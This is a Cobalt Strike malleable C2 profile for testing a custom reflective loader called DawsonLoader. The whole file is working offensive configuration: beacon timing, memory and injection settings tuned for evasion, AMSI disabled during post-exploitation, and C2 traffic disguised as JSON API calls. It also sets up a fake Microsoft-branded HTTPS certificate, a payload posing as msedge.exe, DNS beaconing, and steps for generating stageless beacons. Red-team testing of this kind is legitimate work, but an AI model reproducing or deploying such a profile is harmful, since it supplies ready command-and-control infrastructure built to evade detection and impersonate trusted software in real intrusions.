#
# Dawson-Loader Test Profile
# Simple Cobalt Strike C2 profile for testing DawsonLoader uDRL with jopcall
#

# ============================
# GLOBAL OPTIONS
# ============================
set sample_name "DawsonLoader Test Profile";

set sleeptime "60000";     # Default sleep time (60 seconds)
set jitter    "20";        # Sleep time jitter (20%)
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";

set host_stage "false";    # Disable staging (use stageless payloads for uDRL testing)

# ============================
# STAGE CONFIGURATION (uDRL)
# ============================
stage {
    set userwx        "false";     # Use RW/RX memory instead of RWX (more evasive)
    set obfuscate     "true";      # Enable stage obfuscation
    set cleanup       "true";      # Clean up stage after execution

    # Allocator options for DawsonLoader:
    # 0x0 = VirtualAlloc (default)
    # 0x2 = MapViewOfFile
    # 0x3 = HeapAlloc (CURRENT - more reliable for testing)
    # 0x4 = DLL Module Stomping (recommended for evasion)
    set allocator     "HeapAlloc";  # Using HeapAlloc for better reliability

    # Module stomping configuration (only used if allocator = 0x4)
    # set module_x64 "wwanmm.dll";      # DLL to stomp (64-bit)
    # set module_x86 "wwanmm.dll";      # DLL to stomp (32-bit)

    # Stage transforms (applied to stager)
    transform-x86 {
        prepend "\x90\x90";            # NOP sled
    }

    transform-x64 {
        prepend "\x90\x90";            # NOP sled
    }

    # String replacement for process names
    stringw "kernel32.dll";
    stringw "msvcrt.dll";

    # PE/COFF customization
    set checksum        "0";
    set compile_time    "14 Jul 2023 10:15:32";
    set entry_point     "170000";
    set image_size_x86  "6586368";
    set image_size_x64  "6586368";
    set name            "msedge.exe";
    set rich_header     "";
}

# ============================
# PROCESS INJECTION
# ============================
process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx  "false";          # Start with RW, change to RX later
    set userwx    "false";          # Never use RWX

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90";
    }

    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

# ============================
# POST-EXPLOITATION
# ============================
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\rundll32.exe";
    set spawnto_x64 "%windir%\\sysnative\\rundll32.exe";
    set obfuscate   "true";
    set smartinject "true";
    set amsi_disable "true";
}

# ============================
# HTTP GET (C2 Communication)
# ============================
http-get {

    set uri "/api/v1/updates /api/v1/telemetry /api/v1/metrics";

    client {
        header "Accept" "text/html,application/json";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Connection" "keep-alive";

        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";
        header "X-Powered-By" "Express";
        header "Cache-Control" "no-cache, no-store, must-revalidate";

        output {
            base64url;
            prepend "{\"data\":\"";
            append "\",\"status\":\"success\"}";
            print;
        }
    }
}

# ============================
# HTTP POST (C2 Communication)
# ============================
http-post {

    set uri "/api/v1/submit /api/v1/upload /api/v1/sync";
    set verb "POST";

    client {
        header "Accept" "application/json";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
        header "Content-Type" "application/json";
        header "Connection" "keep-alive";

        id {
            base64url;
            prepend "id=";
            header "Cookie";
        }

        output {
            base64url;
            prepend "{\"data\":\"";
            append "\",\"timestamp\":\"";
            append "\"}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";
        header "X-Powered-By" "Express";

        output {
            base64url;
            prepend "{\"result\":\"";
            append "\",\"status\":\"received\"}";
            print;
        }
    }
}

# ============================
# HTTP STAGER (if needed)
# ============================
http-stager {
    set uri_x86 "/api/v1/download32";
    set uri_x64 "/api/v1/download64";

    client {
        header "Accept" "*/*";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }

    server {
        header "Content-Type" "application/octet-stream";
        header "Server" "nginx/1.18.0";
        output {
            print;
        }
    }
}

# ============================
# HTTPS CERTIFICATE
# ============================
https-certificate {
    set CN       "api.microsoft-updates.com";
    set O        "Microsoft Corporation";
    set C        "US";
    set L        "Redmond";
    set ST       "Washington";
    set validity "365";
}

# ============================
# CODE SIGNING CERTIFICATE
# ============================
code-signer {
    set keystore   "keystore.jks";
    set password   "password";
    set alias      "server";
}

# ============================
# DNS BEACON (Optional)
# ============================
dns-beacon {
    set dns_idle             "0.0.0.0";
    set dns_sleep            "0";
    set maxdns               "255";
    set dns_stager_prepend   ".stage.";
    set dns_stager_subhost   ".api.";
    set dns_max_txt          "252";
    set dns_ttl              "1";

    # DNS A record queries
    set A_name "cdn.";
    set AAAA_name "www6.";
    set TXT_name "api.";
}

# ============================
# MALLEABLE PE OPTIONS
# ============================
# Note: PE/COFF options are set in the stage block above

# ============================
# NOTES FOR TESTING
# ============================
# 1. Load this profile in Cobalt Strike:
#    - Cobalt Strike → Script Manager → Load → dawson-test.profile
#
# 2. Load DawsonLoader Aggressor script:
#    - Script Manager → Load → dist/DawsonLoader.cna
#
# 3. Generate stageless beacon (recommended):
#    - Attacks → Packages → Windows Stageless Payload → x64
#    - Output: Windows EXE or Service EXE
#
# 4. Test different allocators by changing stage.allocator:
#    - "VirtualAlloc" (0x0) - Default, most compatible
#    - "MapViewOfFile" (0x2) - Uses file mapping
#    - "HeapAlloc" (0x3) - Uses process heap
#    - For DLL stomping (0x4), uncomment module_x64/x86 settings
#
# 5. To test jopcall syscalls during loading:
#    - Enable debug output in your test environment
#    - Use Process Hacker/Process Explorer to inspect memory
#    - Attach WinDbg and check call stacks during allocation
#
# 6. For Sleepmask testing (once compiled):
#    - Uncomment and configure sleep_mask option
#    - set sleep_mask "true";
#    - Load sleepmask.cna in Script Manager
